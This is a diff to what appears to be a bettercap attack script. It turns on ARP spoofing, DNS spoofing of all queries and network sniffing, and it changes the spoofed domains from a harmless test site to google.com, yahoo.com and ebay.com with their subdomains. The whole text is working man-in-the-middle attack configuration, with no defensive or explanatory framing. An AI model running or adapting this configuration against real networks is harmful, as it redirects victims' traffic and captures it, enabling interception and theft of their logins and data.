@@ -18,9 +18,10 @@ arp.spoof on
 
 # DNS spoof
 set dns.spoof.all true
-# set dns.spoof.domains example.com,*.example.com
-set dns.spoof.domains httpforever.com,*httpforever.com
+set dns.spoof.domains google.com,*.google.com,yahoo.com,*.yahoo.com,ebay.com,*.ebay.com
 # set dns.spoof.address 192.168.1.50   # defaults to local IP if omitted
 
 dns.spoof on
+
+# Start sniffing (output path set by launcher)
 net.sniff on
